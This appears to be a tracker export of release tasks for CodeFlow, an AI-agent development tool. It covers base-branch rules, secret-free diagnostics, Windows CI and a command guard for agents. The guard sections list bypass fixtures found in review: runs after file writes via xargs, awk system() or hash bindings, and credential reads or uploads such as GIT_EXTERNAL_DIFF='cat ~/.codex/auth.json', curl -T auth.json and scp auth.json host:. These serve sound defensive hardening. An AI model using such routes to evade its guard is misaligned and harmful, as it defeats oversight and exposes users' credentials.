Harness routes (vendor docs fetched 2026-10-28; each link resolved)
  • Claude Code: /loop at a fixed interval or self-paced; scheduled tasks are session-scoped, fire only while the session runs and is idle, expire after seven days, and are restored by --resume except a self-paced loop (https://code.claude.com/docs/en/scheduled-tasks.md). After a usage limit, an interactive subscription session waits and continues on its own, though a permission prompt still stops it (https://code.claude.com/docs/en/interactive-mode.md). A Stop hook can block a stop, with stop_hook_active against loops (https://code.claude.com/docs/en/hooks.md); /goal keeps working toward a condition (https://code.claude.com/docs/en/goal.md); resume restores the conversation and unexpired scheduled tasks but not background shells (https://code.claude.com/docs/en/sessions.md). Cloud scheduled tasks cannot reach the local clone (https://code.claude.com/docs/en/routines.md). Remote Control can push a notification to a phone (https://code.claude.com/docs/en/remote-control.md).
  • Codex CLI: no clock-based schedule in the CLI (https://learn.chatgpt.com/docs/automations); /goal keeps a session working toward a stop condition (https://learn.chatgpt.com/use-cases/follow-goals); a Stop hook that blocks continues the session with its reason as the next prompt (https://learn.chatgpt.com/docs/hooks); an active turn may finish after a usage limit, then nothing runs until the reset (https://learn.chatgpt.com/docs/pricing).
  • Grok Build: /loop <interval> <prompt>, at most 50, expiring after seven days (https://docs.x.ai/build/features/background-tasks); hooks include Stop, but the page calls PreToolUse the only blocking event (https://docs.x.ai/build/features/hooks). Grok production and building are unqualified in CodeFlow (cf-model-orchestrator/resources/routing/transport.md, the seat table), so a Grok session cannot run a building activation until that changes.
  • Herdr: no timer; herdr agent wait and herdr agent prompt could let a keeper deliver a tick to an interactive seat (https://herdr.dev/docs/cli-reference/). That is an experimental Codex route: it is advertised only once AC-9's native run proves it, and codex exec, claude -p, grok -p and hand-written app-server calls stay forbidden as work seats (cf-model-orchestrator/resources/routing/transport.md).

Planning expectation, for AC-1 and AC-9 to confirm: Claude Code's fixed-interval scheduled tasks are the likely first supported route; Codex's /goal continues work but is not a clock, so a Codex session may have no supported recurring route and then says automatic continuation is not armed. Not verified in planning: whether scheduled ticks fire in a Claude background session, Stop-hook behaviour there, and Grok loop firing while idle.

Added 2026-10-29 from the session design, revision 12.3: the scheduled-tasks page read that day documents ids, a listing, firing between turns only, no catch-up, constant jitter for evenly spaced schedules and a seven-day expiry from creation with one final fire. The activation trusts the ids CronCreate returns and the rows CronList shows as its own tool results, and owns a job by the random nonce in its prompt. Still unverified until build: that a fire delivers its prompt unaltered, the expiry behaviour, that CronCreate, CronDelete and gh pr merge run in a scheduled turn without a permission prompt, and whether jobs keep firing in a conversation after /branch. The route reference also records, as not supported, a Codex or Grok session as activation owner with a tick route and trigger kinds with no list surface (design rows H2, H3 and E9, tracked as TSK-1074).

Release/The 4.0.0 milestone fixes/Away session amendment (2026-10-28)/New work starts from the live tip of the branch that holds the work it needs

New work starts from the live tip of the branch that holds the work it needs

TSK-1047todo

not recorded

The whole outcome and context, from the record

Outcome

not recorded

Context

The operator's rule of 2026-10-28, given for the away capability and general by its wording: new work starts from the live tip of the branch that already holds the work it needs. That is main when main has it; when the needed work has landed on an epic or integration line that main has not received yet, it is that line's tip; never a stale copy of either. The target's current tip is merged in before review.

What enforces it today, by code reading on the line tip 654935d52 (not reproduced in planning; AC-1 reproduces it):

  • codeflow work claim fetches the target's remote and origin (crates/codeflow-core/src/workgraph/readiness.rs:1652-1695, refresh_claim), judges readiness on the target's live tip and creates the task branch there (claim_on, :1734-1810); with --on it stacks on a reviewed predecessor's pull request head, checked live (crates/codeflow-cli/src/cmd/work.rs:445-473). A standalone claim must contain its current target (readiness.rs:1717-1722). So the claim route starts from a live tip.
  • codeflow work start checks planning and anchoring (work.rs:314-361, plan_check) but, as far as reading shows, not that HEAD contains the target's current tip, so a branch made by hand from main or from a stale copy of the line passes it.
  • When the needed work landed on another line (for example an EPC-025 task the EPC-022 task builds on, before that line is merged into EPC-022), readiness is judged on the task's own target, where the predecessor is not complete, so work claim refuses; whether --on accepts a predecessor whose pull request already merged into another line is not known.
  • "Merge the current line in before review" is an instruction (.codeflow/rules/worktrees.md:160-162, the map's build row); no check reads it before review. TSK-1041 (EPC-023, 4.1.0) will report base-moved pull requests.

Outcome: work claim chooses and records one base by the rule below, work start refuses a branch that does not contain it, the route for a predecessor on another line is one documented command that works, and before review codeflow ci warns when the head does not contain its target's current tip.

The base rule (one rule, settled in planning after the Codex review of PR 379):

Figure: how work claim picks the base. main is a valid base when it is the target and holds the work; no rule prefers a line for its own sake.

Rules:

  • The base is fixed at claim. work claim records the base commit and its source in durable Git or claim metadata that does not depend on the coordination ledger (AC-1 decides which: the claimed branch's creation point as pushed, a note or ref beside it), because no gate reads the ledger (docs/coordination-ledger.md:386-392, TSK-422 AC-8). A copy in the ledger for reporting is allowed. work start checks that HEAD contains that recorded base, and, for an unclaimed branch made by hand, the base the rule picks at start.
  • A source that advances after the claim does not invalidate the start; codeflow ci warns until the target's current tip is merged in, which the contract already requires before review (worktrees.md:160-162).
  • A reviewed pin stays valid while the predecessor's pull request head still equals the pinned SHA (work.rs:445-473); when it moves, claim and start refuse and name the new head, as today.
  • Fail closed: when the remote cannot be fetched, work claim and work start refuse admission, naming the remote and the last fetch time, because the live tip cannot be proven. codeflow ci cannot see the target's current tip in that case and reports it as unverified with a warning.
  • A wrong base is a refusal at work start at the git.work_planning level the project sets, and a warning in codeflow ci, since an author merging the target in is the fix.

Non-goals: merging lines into each other (the epic's line-sync route, issue #280); the full open-PR report (TSK-1041).

Release/The 4.0.0 milestone fixes/Printed project values amendment (2026-10-28)/Printed diagnostics name places, never project values

Printed diagnostics name places, never project values

TSK-1051todo

After this merges, an adopter can show CodeFlow's diagnostics in a terminal, a CI log or an agent transcript without them printing a value.

The whole outcome and context, from the record

Outcome

After this merges, an adopter can show CodeFlow's diagnostics in a terminal, a CI log or an agent transcript without them printing a value, key or line the project wrote.

Context

CodeFlow prints diagnostics about files a project writes: parser errors, semantic validation messages, warnings and diagnostic reports. Several of them print what the project wrote: a parser message quotes a value, a key or the offending source line, and a validation message repeats the rejected value. A project file can hold a secret, so these messages can leak it to a terminal, a CI log or an agent transcript. Outcome: every such diagnostic names the file and, where the parser or validator gives one, the line, column and schema names, and never a value, key or line the project wrote, while each command still refuses, warns or skips as it does today.

The work starts with an inventory (AC-1), because the set of readers and sinks is not known: two reviews of this record found sites in all three crates and in shipped scripts that a list of modules missed. The inventory decides the build.

Display contract, stated identically in TSK-1029 and TSK-1051: a diagnostic, report line or export never contains a value, key, heading or line a project wrote, in its text, its Debug form or any error it wraps. It may name a path, a line and column, a count, and a schema name or heading CodeFlow defines. A version is shown as MAJOR.MINOR.PATCH, plus a prerelease only in CodeFlow's own release form (alpha.N, beta.N, rc.N); any other prerelease, and any build metadata, is shown as (with a suffix), and a value that does not parse as a version is not shown.

Dependency contract with TSK-1029, at TSK-1029's head 4a37f6618 (PR 385). Each shared reader and each printer has exactly one owner; regression tests in this task may still cover shared consumers.

  • TSK-1029 owns everything codeflow update and codeflow update --pin print and write to the --diff export, and the readers and wrappers they reach: the project metadata and state files (scaffold/state.rs, registry.rs and its locked read in file_lock.rs), the scaffold version check and the version display (scaffold/version.rs), pending update records (scaffold/update/pending.rs), the PR template diagnosis and its headings (scaffold/pr_template.rs), the workspace policy load (hooks/policy.rs Policy::load_file), the remote policy read (remote.rs), the CI pin checks shared with codeflow doctor (scaffold/release_pin.rs, doctor/ci_pin.rs) and the release download and --pin argument messages. It also owns ParsePlace and the two helpers in scaffold/mod.rs, toml_error and json_error: ScaffoldError keeps only a parse place and never a parser error as its source, so its text, Debug form and chain hold no parser message. TSK-1029's adversarial helper tests and its canary test over update and update --pin (tier_floor_e2e.rs) are the contract.
  • TSK-1051 owns every other reader and printer in codeflow-core, codeflow-cli, codeflow-present and every shipped asset that runs (assets/base/ scripts and CI files, the docs portal starter scripts under assets/docs-portal/, and their mirrors and baselines), including semantic validation (such as hooks/policy_schema.rs), codeflow init's report, and every error type outside ScaffoldError that keeps a parser error as its source. A chained error is a sink: its sources and Debug form are printed wherever the CLI prints the chain.

Sites the reviews named, each to be placed in the inventory: hooks/policy_schema.rs:1218 (a rejected release branch pattern), testing/config/mod.rs:586 (a glob) and :817 (a schema version), doctor/mod.rs:1017 (a hook matcher), testing/report/junit.rs:317 and testing/coverage/cobertura.rs:113 (XML parser text, which names project-written tags), codeflow-present/src/config.rs:141 printed at codeflow-cli/src/cmd/present.rs:205, capability.rs:178, ids/state.rs:59, delegate.rs:1681, security/policy.rs:63 and git/ci.rs:139 (line numbers at the line tip 5f84f30f5); the error types that keep a parser error as their source (error.rs, ledger/mod.rs:77, testing/error.rs:76, testing/setup/mod.rs:497); and codeflow recall's coverage diagnostic, which carries the project's name (recall.rs:555, printed at codeflow-cli/src/cmd/recall.rs:134). Shipped scripts are sinks too: the CI pin installers in assets/base/ci/ print a duplicated digest key by name (fail("lists " key " twice")) in the project's CI log, and the docs portal starter scripts forward parser and validation messages (assets/docs-portal/starter/scripts/adapter.mjs:55, :107, :127-128, whose output scripts/workflow.mjs:48 passes on).

Out of scope, settled in the inventory sink by sink with a reason: the content payload a command was asked to show, such as the matching snippets codeflow recall prints (codeflow-cli/src/cmd/recall.rs:122). Errors, warnings, coverage notes and other diagnostics of the same commands stay in scope. Non-goal: changing whether a command refuses, warns or skips.

Release/The 4.0.0 milestone fixes/Guard scope follow-ups amendment (2026-10-28)/Runs after a same-line write fail closed on an unsandboxed host

Runs after a same-line write fail closed on an unsandboxed host

TSK-1052todo

After this merges, an adopter on any host where the guard cannot establish that the sandbox contains a command can rely on the guard to.

The whole outcome and context, from the record

Outcome

After this merges, an adopter on any host where the guard cannot establish that the sandbox contains a command can rely on the guard to refuse any command that runs code after the same line wrote a file, unless the guard verified that run.

Context

Source: the operator's TSK-1002 scope decision of 2026-10-28 (the option D scope in Fable's note target/tsk1002-option-d-scope.md in the guard-bypass-classes worktree, recorded in RELEASE-PLAN.md). Four review rounds on TSK-1002 (PR 346) reopened the same class: a file the line wrote, or a tree it copied or extracted, runs through a route the text guard did not list. Text cannot list every run route, so TSK-1002 withdraws "files run after a write" from the text guard's promise and keeps its written-file checks as a filter. Where the sandbox contains the run, the kernel is the boundary; this task supplies the fail-closed rule everywhere else.

This is a follow-up of TSK-1002. TSK-1002 landed in PR 346 on 2026-10-30 and the depends_on edge to it is recorded. Both prerequisites were verified before this task was unblocked: PR 346 has landed, and TSK-1002's landed record names this task in follow_ups.

Where the rule applies

The rule applies to every command whose containment cannot be established, decided by the coordinator on 2026-10-28 under the operator's secure-by-default rule. TSK-397's design D (revision 4.1, A6) leaves a command whose sandbox is ineffective but not readable as such on the baseline rule: invisible overrides (a --settings file, server-managed settings, MDM policy, a Codex launch with --sandbox danger-full-access or the bypass flag) and unrecognized unsandboxed retries (a Codex seat, which has no retry field, or a Claude Code version not verified to deliver it). For this class those unknown-containment cases move from TSK-397's baseline to this task's fail-closed rule. TSK-397's Part A stays as approved; this task reads its sandbox_state and adds the stricter condition for this class only.

Containment counts as established only from evidence the requester cannot forge, hide or substitute. AC-1 records what TSK-397's sandbox_state can establish in 4.0.0; design D ships no "observed active" signal (its H-6), so where nothing establishes containment the rule applies on every host, and AC-7 measures that cost.

The rule

A same-line write is any write the guard models, known bytes included (printf x > run, a literal heredoc, a copy, an extraction). Knowing a file's bytes does not show that a later run of them was inspected. After such a write, a later command on the same line that can run code refuses as cannot-verify unless the guard verified that execution: the program's execution identity is established (below) and the code it runs is text the guard read and judged under that interpreter's grammar in a known directory. Launchers and runners whose child the guard does not read (xargs, find -exec, setsid, npx, uv run), text tools that run commands (awk system(), GNU sed e), Make and every program outside the guard's model are never verified.

Execution identity: a command name stands for a program only when it resolves, at judgment time, to an executable the requester cannot substitute. The guard checks the lookup state it can see, same-line and inherited (PATH, including relative and project entries, hash bindings, aliases, shell functions, exported functions and local package directories such as node_modules/.bin or a virtual environment), and the resolved file after links must lie outside every location the session can write: the sandbox's write set where containment is established, and every location the session user can modify elsewhere. A name that does not resolve that way is an unmodelled program. No allowance rests on a name alone.

It generalises the checks the TSK-1002 builder reached for recursive copies (security/composed/paths.rs:1764, runs_after_tree) and for inline code with an unknown directory (security/interpreter.rs:134), both at 399594818. Codex review 01 of PR 390 notes that composed/paths.rs:1565-1588 already keeps exact printf output and literal heredoc bodies; this rule does not treat them as verified runs.

Routes and controls

Each route is a fixture. Both guards allowed each one at 399594818 and on the line base (the reviews' replays; nothing was executed):

SourceRouteExample
Codex review 04, finding 1child execution after a tree copycp -r fixture/src fixture/out; xargs python3 <<< fixture/out/src/helper.py; the find -exec, uv run, poetry run, bundle exec and npm exec siblings
Codex review 04, finding 2tree-producing operationstar xf fixture/archive.tar -C fixture/out; python3 fixture/out/helper.py; the unzip and ditto siblings; new and overwritten destinations
Codex review 04, finding 4a command-hash bindingcp fixture/source fixture/run; hash -p ./fixture/run fixture_tool; fixture_tool
Fable review 06, Major 2bare names through launchers and runners after a PATH change, from literal bytesprintf x > run; chmod +x run; PATH=.:$PATH xargs run <<< a, xargs -I{} run {}, setsid run, npx run, npm exec -- run, uv run run; the same with a literal heredoc as the writer
Fable review 06, Major 2text tools that run commandsPATH=.:$PATH awk 'BEGIN{system("run")}', gawk, sed -e '1e run' notes.md

Unknown-containment fixtures (Codex review 01 of PR 390, finding 1): each route above judged with a Codex payload under a readable cf-guard profile, a Claude Code payload without the retry field from a version not verified to deliver it, and a host whose readable Claude settings show the sandbox but whose containment sandbox_state cannot establish (the case of a --settings file, server-managed settings or MDM policy the guard cannot read).

Controls after a write, allowed in every case only while their execution identity is established: printf x > notes.txt; cat notes.txt, cp -r src out; ls out, cat out/notes.rs, git add out and PATH=.:$PATH ls. Such a control whose name resolves into a location the session can write, or through an alias, function or hash binding, refuses like an unmodelled program. cargo run and npm test on a line with no write before them are outside this rule and keep the base's verdict.

Non-goals: containing what a program does once it runs (the sandbox's job where containment is established); modelling runner directories (TSK-1053); editing TSK-397's record or its decision rule.

Outcome

Release/The 4.0.0 milestone fixes/Guard scope follow-ups amendment (2026-10-28)/Runner directory grammars

Runner directory grammars

TSK-1053todo

After this merges, an agent can run inline code that names no protected path under `uv run`, `npm exec`, `npx`.

The whole outcome and context, from the record

Outcome

After this merges, an agent can run inline code that names no protected path under `uv run`, `npm exec`, `npx`, `poetry run` and `bundle exec` without being refused wherever the runner and its program resolve to executables the session cannot replace, and the guards judge reads under each of those runners in the directory that runner uses.

Context

Source: the operator's TSK-1002 scope decision of 2026-10-28 (the option D scope in Fable's note target/tsk1002-option-d-scope.md in the guard-bypass-classes worktree, recorded in RELEASE-PLAN.md), with Codex review 04's per-runner table and Fable review 06's runner section (PR 346 at 399594818) as input, and Codex reviews 01 and 02 of PR 390 with the coordinator's decisions on them (2026-10-28).

Package and project runners (uv run, npm exec, poetry run and the like) start their command in a directory their options, environment or configuration choose. The guard does not model them, so at 399594818 every such runner makes the directory unknown (security/outward.rs:1661, unmodeled_launch; MODELED_LAUNCHERS at :1623), and TSK-1002's unknown-directory rule then refuses all inline code under them. That refusal is sound but costly: agents run these lines constantly. Under the option D scope, a runner's child directory leaves the text guard's promise unless a grammar reads it; this task writes those grammars.

This is a follow-up of TSK-1002. TSK-1002 landed in PR 346 on 2026-10-30 and the depends_on edge to it is recorded. Both prerequisites were verified before this task was unblocked: PR 346 has landed, and TSK-1002's landed record names this task in follow_ups.

The change: the guards read where uv run, npm/pnpm/yarn exec, npx, poetry run and bundle exec run their command, through one execution-context representation shared with the existing directory grammars (env -C, ruby -C, tar -C), so reader words and inline code under them are judged in the right directory. A grammar applies only when the runner's and the launched program's execution identities are established; an option the grammar does not list, or an identity it cannot establish, leaves the directory or the program unknown and refuses as today.

Execution identity, as in TSK-1052: a name stands for a program only when it resolves, at judgment time, to an executable the requester cannot substitute. The guard checks the lookup state it can see, same-line and inherited (PATH, hash bindings, aliases, shell functions, exported functions), and the runner's own lookup for the child (node_modules/.bin up the project walk, the project's virtual environment, Bundler binstubs); the resolved file after links must lie outside every location the session can write (the sandbox's write set where TSK-397's sandbox_state establishes containment, every location the session user can modify elsewhere). Fable review 06 suggested identifying runners by name; the operator's security rule and design D's removal of name-based exemptions (tsk-397-design-D.md:61) take precedence, so no allowance here rests on a name alone. A child that resolves inside a writable location, such as a regular python file in .venv/bin or a node in node_modules/.bin, is an unmodelled program.

Directory rules to model, from the reviews and the runners' docs, each confirmed by AC-1 before it is built:

RunnerChild directoryNotes
uv runthe invoking directory--directory DIR (also uv --directory DIR run) and UV_WORKING_DIR move it; --project DIR changes project discovery, not the directory; environment-file options change the command's environment
npm exec, npx, pnpm exec, yarn execthe nearest project root, found by walking up from the invoking directory (ancestors only)-w/--workspace (repeatable), --workspaces/--ws, --include-workspace-root, --prefix, -C/--dir, --cwd, npm_config_* variables and project configuration move it; --call/-c runs shell text
poetry runthe invoking directory-C/--directory DIR moves it; --project/-P does not
bundle execthe invoking directory; no directory optionBUNDLE_GEMFILE names a Ruby file Bundler evaluates; RUBYOPT passes Ruby options
cargo run --the invoking directorywords after -- are the built program's arguments, never a nested interpreter call or inline code; cargo's own directory options and a configured target runner need their own treatment; the built program lives in writable build output, so its identity is not established

Over-refusals this lifts where both identities are established, each refused at 399594818 (Fable review 06, "The runner over-refusal"): uv run python -c 'print(1)', poetry run python -c ..., bundle exec ruby -e ... and npm exec -- node -e ....

cargo run -- python3 -c ... is not lifted. Its trailing words are the built program's data, not inline code, and the guard classifies them that way; but cargo run builds the program into writable output and runs it (Cargo's cargo run documentation), so the built program's identity is not established and it is judged as an unmodelled program. Every cargo run row the base refuses keeps refusing, and the refusal names the unestablished identity, not inline code. The classification changes the reason, not the verdict.

direnv exec DIR is not modelled. Fable review 06 assigned it the child directory DIR; Codex review 02 of PR 390 showed from direnv's source (v2.35.0 internal/cmd/cmd_exec.go, internal/cmd/rc.go) that it uses DIR to discover configuration, searching ancestors too, loads that environment, resolves the child through the loaded PATH, and runs it without changing the directory. The guard cannot establish that environment or the child's identity from text, so under the operator's rule to remove what cannot be made sound, direnv exec stays an unmodelled runner with the unknown-directory rule.

Precedence where rules meet:

  • TSK-397's strict branch: a grammar never relaxes a refusal the strict branch makes for a known directory; it only supplies the directory and the launched program.
  • TSK-1052's rule: where containment is not established and a same-line write precedes the runner, TSK-1052's refusal prevails and the grammar decides nothing about the run.
  • Neither precedence lets a line the base refuses become allowed outside the one reasoned list of AC-8.

Operands of every program under a runner (amended 2026-10-28 from Fable review 07 of PR 346, Minor 5, at 1f1605f99): TSK-1002's rule for reader words under an unmodelled runner is a list of reader names (security/outward.rs:1645-1684, LAUNCHED_READERS), so it skips interpreter data operands and every program outside the list. uv run --directory <public> python3 tool.py auth.json and frobnicate python3 tool.py auth.json allow, while cd "$D" && python3 tool.py auth.json refuses; under a runner, openssl rsa -in auth.json, gpg -d auth.json, rsync auth.json /tmp/, dd if=auth.json, curl -T auth.json, scp auth.json host: and xargs cat <<< auth.json allow. AC-14 requires every program's operands under a runner to be judged as the same command run directly, or refused when they cannot be.

Programs that run Git without naming it (amended 2026-10-29 from Fable review 14 of PR 346, at 409de0b2e, tracked once here by the issue 404 planning amendment, since PR 346 may not change this record): GIT_EXTERNAL_DIFF='cat ~/.codex/auth.json' lazygit allows, and so do the same variable before tig, hub, cargo, make and pre-commit. The line does not visibly run Git, so the program value is not judged, although these programs run Git and Git honours the variable. Rechecked on the line's binary at bd721f39b (both guards, exit 0): the same GIT_EXTERNAL_DIFF before lazygit, cargo test, git status and git diff, and GIT_PAGER='cat ~/.codex/auth.json' tig, so a visible git call does not refuse it either. The class is expected to close in PR 346 (TSK-1002), whose fix batch the coordinator sent it to on 2026-10-29; AC-17 is the planning backstop and holds whether or not PR 346 closes it. The value is judged as a program on the line; what the launched program does once it runs stays outside the promise.

Non-goals: what the launched program does once it runs (outside the promise under option D); runs after a same-line write (TSK-1052); allowing any cargo run row the base refuses; direnv exec and runners not listed above, such as pipx run, uvx, bunx, pnpm dlx and yarn dlx, which keep the unknown-directory rule.

Outcome

Release/The 4.0.0 milestone fixes/Report, Windows test, runner operand and checkpoint amendment (2026-10-28)/A planning amendment reports epic criteria it adds, removes or rewords

A planning amendment reports epic criteria it adds, removes or rewords

TSK-1061todo

After this merges, a reviewer of a planning amendment can see every epic criterion it adds, removes or rewords in `codeflow ci`'s output.

The whole outcome and context, from the record

Outcome

After this merges, a reviewer of a planning amendment can see every epic criterion it adds, removes or rewords in `codeflow ci`'s output, instead of a note saying the criteria did not change.

Context

Source: Codex review 03 of PR 390 (GPT-6 Astra, session 01a18401-c6f9-71c2-a4a6-4b5b0d81c8b4, target/review-TSK-1002-followups-codex-03.md in the plan-tsk1002-followups worktree), confirmed by reading the code at PR 390's head e91633a3e.

codeflow ci prints one work.planning_amendment note per changed record so the reviewer of a planning amendment sees what it changes; ADR-0076 says the criteria delta is computed by CI, never declared by the author. changes() in crates/codeflow-core/src/workgraph/amendment.rs compares criteria only when the record is a task (:256, after.kind == RecordKind::Task). An epic whose criteria change is reported as "changed, with no status or criteria change" (:275).

Observed on PR 390 itself: its range adds EPC-022 AC-152 and AC-153 and adds a superseding amendment note under AC-86, and codeflow ci --into the line printed "EPC-022: EPC-022 changed, with no status or criteria change" at 22c503e55 and at e91633a3e.

This is a reporting defect, not an admission bypass: the planning class and every refusal stay as they are. Its cost is that the human reviewer, who by the note's own text "confirms each change before it lands", is told an epic's criteria did not change when they did.

The remedy: compare an epic's criteria the way a task's are compared, with the existing criteria_delta (workgraph/acceptance.rs:3617), so an added, removed or reworded epic criterion, and an amendment note added under one, is printed. The R-119 completion flags stay task-only, since an epic's completion is judged elsewhere.

Non-goals: changing what the planning class admits or refuses; changing task criteria reporting beyond keeping it as it is.

Outcome

Release/The 4.0.0 milestone fixes/Report, Windows test, runner operand and checkpoint amendment (2026-10-28)/The Windows killed-gate test waits on a signal, not a fixed deadline

The Windows killed-gate test waits on a signal, not a fixed deadline

TSK-1062complete

After this merges, a maintainer reading a Windows run can trust that a failure of the killed-gate test names its cause.

The whole outcome and context, from the record

Outcome

After this merges, a maintainer reading a Windows run can trust that a failure of the killed-gate test names its cause, and that the test leaves no process behind.

Context

Source: the line's own push run at dc9ec266d (run 40750765706, job "windows tests (12 of 12)", job id 123053893714). The test codeflow-core testing::runner::tests::a_killed_gate_ends_its_target_tree_on_windows failed as FAIL + LEAK [61.585s], panicking at crates/codeflow-core/src/testing/runner/mod.rs:1960 with "the target recorded its pid". The same test passed on the line's earlier run at e937da4ee. Nine other tests in the same shard were reported slow (over 60 seconds), so the runner was loaded.

The test (TSK-142 AC-3) spawns its own test binary as a gate (windows_gate_helper, :1905), whose target runs cmd.exe, then powershell, which writes its pid to pid.txt. The test polls for that file 1,200 times at 50 ms (:1950-1960), a fixed 60-second deadline, then kills the gate and checks the tree ended. Three things are not known from the log, and each could produce the same panic:

  • the helper's start, the gate's start and PowerShell's start were slower than 60 seconds on a loaded runner;
  • the helper or its target failed early, which the test cannot see: the helper's stdout and stderr go to null and run_target's result is discarded (let _ =, :1913);
  • the pid file was written in a form the parse rejects.

The LEAK verdict also shows a second defect: when the wait panics, the spawned gate and its target tree are left running, because the kill happens only after the wait succeeds.

The fix: the test passes or fails for a stated cause on a slow runner, never on an arbitrary deadline alone, and it never leaves its gate running. Raising the deadline alone is not a fix.

Non-goals: changing what TSK-142 AC-3 proves (a killed gate ends its target tree); the Windows partition balance (shard 5 of 12 hit the 30-minute limit on the first attempt of PR 392's run 40775926015), which is a separate outcome.

Outcome

Release/The 4.0.0 milestone fixes/Report, Windows test, runner operand and checkpoint amendment (2026-10-28)/Every Windows test partition finishes well inside its job limit

Every Windows test partition finishes well inside its job limit

TSK-1063complete

After this merges, a maintainer can rely on every Windows test partition of this repository's CI finishing with a stated margin under its.

The whole outcome and context, from the record

Outcome

After this merges, a maintainer can rely on every Windows test partition of this repository's CI finishing with a stated margin under its job limit, and on drift being reported before a partition times out.

Context

Source: PR 392's run 40775926015. On its first attempt, "windows tests (5 of 12)" (job 123127783463) hit the job's 30-minute limit at 480 of its 482 tests (corrected from 352 after Codex review 01 of PR 393), while the other eleven partitions finished in 8 to 17 minutes (read from the run's job times on 2026-10-28). A timed-out partition fails the windows verdict, and under this repository's "hosted green before the next landing" rule that holds every ordinary landing on the line.

This repository splits its Windows nextest suite into 12 partitions by measured duration (TSK-265): scripts/windows-partitions.py plans them from scripts/windows-test-times.json, and each windows-tests matrix job in .github/workflows/codeflow-ci.yml runs one partition with timeout-minutes: 30. The plan at this line's tip still estimates about 5.6 minutes for every partition (windows-partitions.py plan), while real partitions take 8 to 30 minutes and more. Leads for the investigation, none confirmed:

  • the timing data was measured on runs 38102896319 to 38111523049 and last changed on 2026-10-14, and tests added since have no measurement;
  • a test binary the data does not know runs in one "rest" partition, and an unmeasured test of a split binary runs in that binary's home partition (windows-partitions.py:137-146), so new slow tests pile up in whichever partition receives them;
  • nothing checks the plan against a run, so the drift showed only as a timeout.

Further evidence, added 2026-10-29 from the coordinator's reading of later runs:

  • On the line, shard 5 takes 24.7 of its 30 minutes (the coordinator's reading). Job times read on 2026-10-29: 25.2 minutes in line run 40807522540 (job 123232552459) and 22.4 minutes in line run 40825861843 (job 123290157555).
  • On PR 386 (run 40798842036), the first attempt of shard 5 (job
    1. timed out at 328 of 482 tests with no test failure. "windows journeys" and the windows verdict then failed because the shard's report was missing. The second attempt (job 123217810982) passed in 23.3 minutes. "37 percent slower" is the coordinator's estimate of that first attempt's runner against the rerun; the calculation is not recorded, so AC-1 recomputes it from per-test durations of the two attempts.
  • On PR 385, a cancellation while shard 5 ran caused the same "windows journeys" failure.

So a normal runner leaves shard 5 under 20 percent headroom, a slower one times it out, and a missing report is read downstream as a failure of its tests.

The fix balances by measured duration, not test count, keeps every partition well under the job limit with a stated margin, and makes drift visible before it times out a job. Raising the job timeout alone is not a fix.

Relation to TSK-384: TSK-384 (issue #203, and issue #352 item 3) lets an adopter split a gate target into its own jobs and run the managed gate as a matrix of shards generated from the test config, in the shipped workflow assets/base/ci/codeflow-ci.yml. This task changes only this repository's own Windows test partitions (.github/workflows/codeflow-ci.yml, scripts/windows-partitions.py and its data). It does not touch the managed workflow, and TSK-384 does not touch these partitions. The Linux coverage shards share the same planner through scripts/coverage-shards.py (TSK-270), so the investigation checks them as a sibling.

Outcome

Release/The 4.0.0 milestone fixes/Report, Windows test, runner operand and checkpoint amendment (2026-10-28)/Update reports a malformed hook group in a person's settings instead of crashing

Update reports a malformed hook group in a person's settings instead of crashing

TSK-1064todo

After this merges, a person whose settings file holds a malformed hook group can run `codeflow update` and get a message naming the event.

The whole outcome and context, from the record

Outcome

After this merges, a person whose settings file holds a malformed hook group can run `codeflow update` and get a message naming the event and the entry to fix, instead of a crash or a hook silently left out.

Context

Source: Codex review 09 of TSK-1029 (PR 385), which found a defect older than that task. When codeflow update merges the shipped Claude settings into a person's .claude/settings.json, it looks for the person's hook group whose matcher equals each shipped group's matcher (crates/codeflow-core/src/scaffold/settings_merge.rs:567). matcher_of returns None both for a group with no matcher key and for an entry that is not an object at all (:94-96). The shipped preset has matcher-less groups for UserPromptSubmit and SessionEnd (assets/base/settings/default.json), so a malformed entry such as "UserPromptSubmit": [null] is taken as the matching group and reaches .as_object_mut().expect("hook group is an object") (:571 on the line tip 3a4522fcb; :663 on TSK-1029's branch). codeflow update then panics instead of giving a diagnostic. The panic text is fixed, so no user content leaks. A second malformed shape fails silently: when a matching group's hooks value is not an array, the merge skips it (:574), so the shipped CodeFlow hook is never added and nothing is reported (Codex review 01 of PR 393).

The fix: a malformed hook group or hook entry gives the same kind of diagnostic other settings problems give, naming the event and the entry, and update never panics on, or silently skips, user-shaped settings JSON. Found by reading the code; neither case has been reproduced yet (AC-1).

Non-goals: changing which hooks are shipped or how valid groups merge; repairing a malformed file automatically.

Outcome

Release/The 4.0.0 milestone fixes/Issue 394 and awk write amendment (2026-10-29)/A task pull request into an epic line judges a sync that edits task files as the line push does

A task pull request into an epic line judges a sync that edits task files as the line push does

TSK-1066complete

After this merges, a maintainer who syncs `main` into an epic line through a task branch gets a block that names the merge and the edited.

The whole outcome and context, from the record

Outcome

After this merges, a maintainer who syncs `main` into an epic line through a task branch gets a block that names the merge and the edited file when the sync hand-edits a task's deliverable or acceptance block, and no block when the sync is clean, in the pull request form as in the line push.

Context

Source: issue #394, reported on 3.1.1, triaged on the line at 35672e8bd by running the issue's fixture (with one added ## Outcome line, which records now require) through three forms: a pull request from the sync, a pull request with a later task commit, and the line push.

The issue's two reported behaviours are already fixed on the line. A clean sync passes in all three forms, and the line push blocks a sync merge that hand-edits a task's file. Two residuals remain:

  • A. The pull request form accepts a hand-edited sync. The check that catches it, receiving_merges::findings (crates/codeflow-core/src/workgraph/acceptance/receiving_merges.rs:86, called from acceptance.rs:4006), returns early when the judged branch is not an epic line (the predicate at receiving_merges.rs:17), so a pull request from a task branch carrying the sync never runs it. In the edited-merge case both pull request forms exit 0 while the line push exits 1.
  • B. The tampered-acceptance case blocks with the wrong cause. The outcome (block) is right, but the messages name CODEOWNERS and "a parent other than its first" (acceptance.rs:1521), and the task-commit form calls the sync "the landing merge" (:1682), instead of naming the acceptance block edit and the merge.

Severity: A is low (the hand edit shows in the pull request diff, and the line push still blocks the line itself), but it matters where hosted CI is the only gate on a task branch that carries a sync. B is low: the block is right and the text points a person at the wrong file.

TSK-339, TSK-340 and TSK-433 (all complete) fixed the main shapes; this task builds on their checks. Placement against TSK-421: TSK-421 (open, EPC-022) owns codeflow line sync and its AC-3 already requires a clean sync to pass in the #176, #181, #217, #218 and #240 shapes. Residuals A and B are binding and message fixes in the acceptance checks, not part of a sync command, so this task is the smaller home; TSK-421 is left unchanged, and this task's clean-case fixture (AC-3) is the regression TSK-421 may reuse.

Outcome
The 4.0.0 milestone fixes EPC-022

